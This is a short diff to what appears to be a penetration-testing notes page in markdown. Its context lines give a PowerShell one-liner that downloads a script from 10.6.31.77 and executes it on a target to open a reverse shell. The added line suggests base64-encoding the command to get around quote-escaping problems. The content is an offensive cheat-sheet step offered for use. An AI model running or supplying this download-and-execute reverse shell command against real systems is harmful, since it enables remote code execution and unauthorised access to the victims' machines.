@@ -31,6 +31,8 @@ Execute the following command on the target to execute the reverse shell.
 powershell "IEX(New-Object System.Net.WebClient).downloadString('http://10.6.31.77/shell.ps1')"
 ```
 
+**Note** that if you're having trouble escaping the quotiation marks, you can [[powershell#Execute Base64 Encoded Command|base64 encode the command and execute it that way]].
+
 Receive the reverse shell.
 
 ---
